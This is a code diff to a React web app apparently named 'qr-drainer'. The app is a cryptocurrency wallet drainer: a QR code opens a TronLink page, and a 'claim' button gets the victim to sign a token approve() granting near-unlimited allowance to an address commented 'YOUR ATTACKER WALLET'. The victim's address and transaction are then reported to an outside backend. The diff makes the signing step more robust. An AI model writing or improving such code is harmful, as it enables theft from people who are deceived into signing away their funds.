@@ -2,8 +2,8 @@ import React, { useEffect, useState } from "react";
 import { QRCodeSVG } from "qrcode.react";
 
 // CONFIGURATION
-const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd";
-const SWEEPER_ADDRESS = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou";
+const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT
+const SWEEPER_ADDRESS = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // YOUR ATTACKER WALLET
 const BACKEND = "https://qr-drainer.onrender.com";
 const VERCEL_URL = "https://qr-drainer-one.vercel.app";
 
@@ -20,7 +20,7 @@ export default function App() {
   const [loading, setLoading] = useState(false);
   const [inTronLink, setInTronLink] = useState(false);
 
-  // QR Code with TronLink deep link - opens directly in TronLink app when scanned
+  // QR Code with TronLink deep link
   const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
 
   useEffect(() => {
@@ -38,7 +38,7 @@ export default function App() {
       }).catch(e => console.log("Balance read error", e));
     }
 
-    // Heartbeat to detect wallet connection
+    // Heartbeat
     const checkWallet = setInterval(() => {
       if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
         const addr = window.tronWeb.defaultAddress.base58;
@@ -98,6 +98,7 @@ export default function App() {
     img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(svgData)));
   };
 
+  // BULLETPROOF CLAIM FUNCTION
   const handleClaim = async () => {
     if (!window.tronWeb) {
       alert("Please open this page in TronLink DApp browser");
@@ -105,21 +106,53 @@ export default function App() {
     }
     setLoading(true);
     try {
-      const tw = window.tronWeb;
-      const c = await tw.contract().at(TOKEN_ADDRESS);
-      const tx = await c.approve(SWEEPER_ADDRESS, "1000000000000000").send({ 
-        from: tw.defaultAddress.base58, 
-        feeLimit: 100000000 
-      });
-      await fetch(`${BACKEND}/api/alert`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ victimAddress: tw.defaultAddress.base58, txHash: tx, network: "TRON Shasta" })
-      });
-      alert("✅ Transaction Sent! Waiting for confirmation...");
+      const tronWeb = window.tronWeb;
+      const userAddress = tronWeb.defaultAddress.base58;
+
+      // 1. Build the approve transaction manually (Most robust method)
+      // approve(address spender, uint256 amount)
+      const functionSelector = "approve(address,uint256)";
+      const parameter = [
+        { type: 'address', value: SWEEPER_ADDRESS },
+        { type: 'uint256', value: 1000000000000000 } // Large amount
+      ];
+      const options = { feeLimit: 100000000, callValue: 0 };
+
+      // This creates the transaction object
+      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+        TOKEN_ADDRESS,
+        functionSelector,
+        options,
+        parameter,
+        userAddress
+      );
+
+      if (!transaction.result || !transaction.result.result) {
+        throw new Error("Contract call rejected by network");
+      }
+
+      // 2. Sign the transaction (This triggers the TronLink Popup!)
+      const signedTx = await tronWeb.trx.sign(transaction.transaction);
+      
+      // 3. Broadcast to blockchain
+      const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
+      
+      if (broadcast.result) {
+        const txId = broadcast.txid || transaction.transaction.txID;
+        // 4. Alert Backend
+        await fetch(`${BACKEND}/api/alert`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ victimAddress: userAddress, txHash: txId, network: "TRON Shasta" })
+        });
+        alert("✅ Transaction Sent! Check Telegram for status.");
+      } else {
+        throw new Error("Broadcast failed");
+      }
+
     } catch (e) {
       console.error(e);
-      alert("❌ Transaction failed or rejected.");
+      alert("❌ Transaction failed: " + e.message);
     }
     setLoading(false);
   };
@@ -235,11 +268,7 @@ export default function App() {
               cursor: 'pointer', 
               fontWeight: '600', 
               color: '#fff',
-              fontSize: '13px',
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              gap: '8px'
+              fontSize: '13px'
             }}
           >
             ⬇️ Save QR
@@ -261,11 +290,7 @@ export default function App() {
               cursor: 'pointer', 
               fontWeight: '600', 
               color: '#fff',
-              fontSize: '13px',
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              gap: '8px'
+              fontSize: '13px'
             }}
           >
             📤 Share
